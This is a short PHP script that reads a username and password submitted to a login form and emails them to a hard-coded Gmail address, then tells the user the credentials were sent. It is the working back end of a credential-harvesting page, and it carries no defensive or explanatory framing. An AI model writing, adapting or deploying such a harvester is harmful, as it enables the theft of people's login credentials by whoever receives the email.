<?php
$username = $_POST['username'];
$password = $_POST['password'];

// Send the username and password to your email
$mail_to = 'ibrahimola33307116@gmail.com';
$mail_subject = 'Login Credentials';
$mail_body = "Username: $username\nPassword: $password";

mail($mail_to, $mail_subject, $mail_body);

echo 'Login credentials sent to your email!';
?>
